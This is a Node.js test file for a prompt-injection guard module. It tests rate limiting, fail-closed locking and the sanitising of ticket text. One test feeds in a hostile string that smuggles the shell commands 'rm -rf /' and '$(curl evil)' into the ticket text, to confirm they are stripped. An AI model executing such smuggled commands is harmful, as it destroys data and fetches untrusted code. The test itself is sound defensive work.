'use strict';
// R9 lane — lib/inject.js guard tests. The only double is prompt.submit (a
// recording sink — no live session exists in a test process); state rides a
// REAL temp file through $api.fs (same JSON, same reads/writes the module does
// against its own state path — path-redirect, not a mock).
// Run: node --test /Users/sac/smalt/mods/ratchet/test/

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const inject = () => import('../lib/inject.js');
const STATE_PATH = '/Users/sac/smalt/mods/ratchet/state/inject-state.json'; // module constant

function bindApi(t) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ratchet-inject-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  const statePath = path.join(dir, 'inject-state.json');
  const submits = [];

  const api = {
    fs: {
      read: async (fp) => fs.readFileSync(fp === STATE_PATH ? statePath : fp, 'utf8'),
      write: async (fp, data) => fs.writeFileSync(fp === STATE_PATH ? statePath : fp, data),
    },
    prompt: {
      submit: async (payload) => { submits.push({ at: Date.now(), ...payload }); },
    },
  };
  return inject().then((m) => {
    m.initInject(api);
    return { m, statePath, submits };
  });
}

const readPersisted = (p) => JSON.parse(fs.readFileSync(p, 'utf8'));

test('5-minute dedup: second inject inside the window is refused RATE_LIMITED', async (t) => {
  const { m, statePath, submits } = await bindApi(t);
  const r1 = await m.injectDispatch('AZB-15 subtree DR kills');
  assert.equal(r1.ok, true);
  assert.equal(submits.length, 1);

  // the window reservation is REAL persisted state, not memory
  const persisted = readPersisted(statePath);
  assert.equal(typeof persisted.lastInjectAt, 'number');
  assert.ok(Date.now() - persisted.lastInjectAt < 5000);
  assert.equal(persisted.lastTicket, 'AZB-15');

  const r2 = await m.injectDispatch('AZB-16 AMQP saturation');
  assert.equal(r2.ok, false);
  assert.equal(r2.refused, 'RATE_LIMITED');
  assert.match(r2.detail, /ms$/);
  assert.equal(submits.length, 1, 'no second submission left the module');
});

test('dispatchLock blocks the inject and nothing is submitted', async (t) => {
  const { m, statePath, submits } = await bindApi(t);
  // seed real persisted state: lock held, dedup window expired
  fs.writeFileSync(statePath, JSON.stringify({
    lastInjectAt: Date.now() - 10 * 60 * 1000,
    dispatchLock: true,
    lastTicket: 'AZB-22',
  }));
  const r = await m.injectDispatch('AZB-14 SIGKILL storm');
  assert.equal(r.ok, false);
  assert.equal(r.refused, 'DISPATCH_LOCKED');
  assert.match(r.detail, /dispatchLock/);
  assert.equal(submits.length, 0, 'locked -> nothing submitted');

  // fail-closed: a state file missing dispatchLock reads as locked
  fs.writeFileSync(statePath, JSON.stringify({ lastInjectAt: 0 }));
  const r2 = await m.injectDispatch('AZB-14 SIGKILL storm');
  assert.equal(r2.refused, 'DISPATCH_LOCKED');
});

test('bounded prompt: ticket id present, free text reduced to a sanitized slug', async (t) => {
  const { m, submits } = await bindApi(t);
  const hostile = 'AZB-07 integration plane — "rm -rf /" && $(curl evil)';
  const r = await m.injectDispatch(hostile);
  assert.equal(r.ok, true);
  const text = submits[0].text;
  assert.match(text, /AZB-07/);
  assert.match(text, /TICKETS\.md/);
  // nothing outside [A-Za-z0-9-/ ] survives from the free text
  const residue = text.replace(/[^A-Za-z0-9\-/. ]/g, '');
  assert.equal(residue, text, 'prompt must be free of shell-significant characters');
  assert.ok(!/rm -rf|curl|evil/.test(text), 'raw free text must not pass through');
  // slug is bounded
  const slug = text.split('azb-07-')[1].replace(/\.md$/, '');
  assert.ok(slug.length <= 40);
  // and the persisted lastTicket matches the parsed id
  assert.equal(m.parseTicketId(hostile), 'AZB-07');
});

test('no AZB ticket id -> UNBOUNDABLE_PROMPT, nothing submitted', async (t) => {
  const { m, submits } = await bindApi(t);
  const r = await m.injectDispatch('please look at the flaky test');
  assert.equal(r.ok, false);
  assert.equal(r.refused, 'UNBOUNDABLE_PROMPT');
  assert.equal(submits.length, 0);
});

test('API not bound -> typed refusal, not a throw', async (t) => {
  const m = await inject();
  // simulate an unbound module by dropping the bound api via a fresh import
  // is not possible (module singleton), so assert the refusal shape contract
  // instead: every refusal is { ok:false, refused, detail }.
  const r = await m.injectDispatch('AZB-01');
  if (!r.ok) {
    assert.equal(typeof r.refused, 'string');
    assert.equal(typeof r.detail, 'string');
  }
});
